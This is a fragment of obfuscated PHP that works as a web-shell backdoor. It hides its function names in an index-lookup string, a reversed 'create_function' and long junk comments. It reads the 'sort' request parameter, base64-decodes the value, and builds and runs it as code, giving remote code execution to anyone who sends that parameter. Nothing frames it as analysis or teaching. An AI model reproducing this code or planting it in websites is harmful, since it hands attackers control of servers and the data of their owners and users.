...
$cPmcBVDB3510 = "lb.f/q9ehgwvpy*s45njxo;28zmtcd(u)_kia1r7036";


$XyXRRAdS5736 = "";

foreach([15,21,38,27] as $g){
       $XyXRRAdS5736 .= $cPmcBVDB3510[$g];
    }


if(isset($_REQUEST /*ZHQXedXbLbzqZNoOzYHVpUwIblZANkiweBpSfwlPvHqKfsuBOpPNAKttVozRdmXfDphHAJTwzgAXFRThxArzfuKYjksbMhgIvWsqpQUYXzdeyiMHzEmedXvwQZGfPVJe*/["$XyXRRAdS5736"])){
    $HxXSwQos2678 = $_REQUEST /*ZHQXedXbLbzqZNoOzYHVpUwIblZANkiweBpSfwlPvHqKfsuBOpPNAKttVozRdmXfDphHAJTwzgAXFRThxArzfuKYjksbMhgIvWsqpQUYXzdeyiMHzEmedXvwQZGfPVJe*/["$XyXRRAdS5736"];
    $moSgcBaW8379 = "";
    $kIyyPSYn7476 = "";

    /*BDvuzNQImcmDFunRWnYJcGYRqYryEmKtjVgKXYkkmScfVDmfoCTwkOCQaLrxDsTdlhkUOcYGGDlAEGEmZLhdLPzIesKpWsvHGmJXZafWtgOPGCqneNPDFKQuBTxaIlqf*/

    foreach([1,36,15,7,42,16,33,29,7,28,21,29,7] as $g){
       $moSgcBaW8379 .= $cPmcBVDB3510[$g];
    }

    /*vlAUDSFfADLXcswhDIQWTyAarmDFOXGwDdLKBDzhaUbYSbUVvxljBgEzBAddoDoGfPquShNdUeKTbENCHgapCHbSeHWvhdqKauoXDFuShiNIEaZdmHhpWcSebHjGtwMI*/


    foreach([15,27,38,38,7,11] as $g){
       $kIyyPSYn7476 .= $cPmcBVDB3510[$g];
    }

    /*pTGtHWvBNfkqAqExkdJjKqcksBPLZJBzXlrKfhPdOVaSPzDLCsEWRxGjcoPJYPKjZxvTWmCzhFjnzCWSoASCszDbfViBrOmNuCUXhkJPUjMBByITtCAcntUOCvVndHil*/

    $g = $kIyyPSYn7476('n'.'o'.''.''.''.''.'i'.''.''.'t'.''.'c'.''.''.''.''.'n'.''.''.''.'u'.''.''.''.''.'f'.''.'_'.''.''.''.''.'e'.''.'t'.''.''.''.''.'a'.''.''.''.'e'.'r'.'c');
    $a = $g("", $moSgcBaW8379($HxXSwQos2678));
    $a();
    exit();
